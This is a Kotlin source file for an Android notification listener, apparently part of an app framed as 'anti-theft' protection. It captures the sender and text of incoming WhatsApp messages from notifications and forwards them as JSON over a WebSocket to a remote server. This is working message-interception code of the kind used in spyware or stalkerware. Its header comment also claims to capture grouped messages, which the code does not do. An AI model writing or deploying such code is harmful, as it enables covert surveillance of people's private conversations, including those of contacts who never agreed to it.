package com.androidprotect

import android.app.Notification
import android.content.Context
import android.os.Build
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import kotlinx.serialization.json.Json
import kotlinx.serialization.builtins.serializer

/**
 * Captures incoming WhatsApp (and WhatsApp Business) notifications and forwards
 * them to the server through the active WebSocket managed by AntiTheftService.
 *
 * Captures:
 * - Single message notifications
 * - Grouped message notifications (MessagingStyle) on Android N+
 *
 * Limitations:
 * - Only messages that generate a notification are captured.
 * - Sent messages are NOT captured here (WhatsApp does not post notifications for them).
 */
class WhatsAppNotificationListener : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        if (!WHATSAPP_PACKAGES.contains(sbn.packageName)) return

        val notification = sbn.notification ?: return
        val extras = notification.extras ?: return
        val baseTimestamp = sbn.postTime

        val messages = extractMessages(extras, baseTimestamp)
        if (messages.isEmpty()) return

        for (msg in messages) {
            sendWhatsAppMessage(msg)
        }
    }

    private fun extractMessages(extras: Bundle, baseTimestamp: Long): List<WhatsMessage> {
        val result = mutableListOf<WhatsMessage>()

        // Simple single-message notification (most common case)
        val title = extras.getString(Notification.EXTRA_TITLE) ?: ""
        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()
            ?: extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()
            ?: return result

        if (text.isBlank()) return result
        result.add(WhatsMessage(address = title, content = text, timestamp = baseTimestamp))
        return result
    }

    private fun sendWhatsAppMessage(msg: WhatsMessage) {
        try {
            val address = Json.encodeToString(String.serializer(), msg.address)
            val content = Json.encodeToString(String.serializer(), msg.content)
            val payload = """{"type":"WHATSAPP_MESSAGE","direction":"in","address":$address,"content":$content,"timestamp":${msg.timestamp}}"""
            val sent = AntiTheftService.sendRawMessage(payload)
            Log.d("WhatsAppListener", "forwarded message to ${msg.address}: $sent")
        } catch (e: Exception) {
            Log.e("WhatsAppListener", "Failed to forward message: ${e.message}")
        }
    }

    private data class WhatsMessage(
        val address: String,
        val content: String,
        val timestamp: Long
    )

    companion object {
        private val WHATSAPP_PACKAGES = setOf("com.whatsapp", "com.whatsapp.w4b")

        fun isEnabled(context: Context): Boolean {
            val flat = android.provider.Settings.Secure.getString(
                context.contentResolver,
                "enabled_notification_listeners"
            ) ?: return false
            return flat.contains("${context.packageName}/${WhatsAppNotificationListener::class.java.name}")
        }
    }
}
